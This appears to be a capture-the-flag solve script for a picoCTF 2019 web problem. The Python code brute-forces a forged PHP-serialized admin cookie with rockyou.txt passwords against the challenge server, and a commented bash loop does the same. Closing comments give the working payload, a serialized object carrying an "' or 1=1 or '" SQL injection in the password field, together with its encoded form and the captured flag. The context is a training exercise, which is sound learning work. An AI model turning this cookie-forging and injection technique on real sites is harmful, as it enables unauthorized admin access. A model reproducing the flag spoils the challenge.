import requests
from base64 import b64encode as b
from urllib.parse import quote_plus as u

url = "https://2019shell1.picoctf.com/problem/45142/index.php?file=admin"
c = 'O:11:"permissions":2:{{s:8:"username";s:5:"admin";s:8:"password";s:{}:"{}";}}'

with open("rockyou.txt", "rb") as f:
    i = 1
    for p in f.readlines():
        p = p.strip().decode()
        if p == "1812overture":
            i = 0
        if i:
            continue
        print(p)
        cookie = {"user_info": u(u(b(c.format(len(p), p).encode())))}
        r = requests.get(url, cookies=cookie)
        if "You are not admin!" not in r.text and "</body>" in r.text:
            print(r.text)

'''
bash equivalent

for i in {0..100}; do curl -s https://2019shell1.picoctf.com/problem/45142/index.php?file=admin -b user_info $(util ue $(util ue $(util be "O:11:\"permissions\":$i:{s:8:\"username\";s:5:\"admin\";s:8:\"password\";s:{length}:\"admin\";}"))); done
'''

# Correct payload: O:11:"permissions":2:{s:8:"username";s:5:"admin";s:8:"password";s:13:"' or 1=1 or '";}
# Encoded: TzoxMToicGVybWlzc2lvbnMiOjI6e3M6ODoidXNlcm5hbWUiO3M6NToiYWRtaW4iO3M6ODoicGFzc3dvcmQiO3M6MTM6Iicgb3IgMT0xIG9yICciO30%253d
# Flag: picoCTF{41f9ada4385bd93a3b15eead30841230}
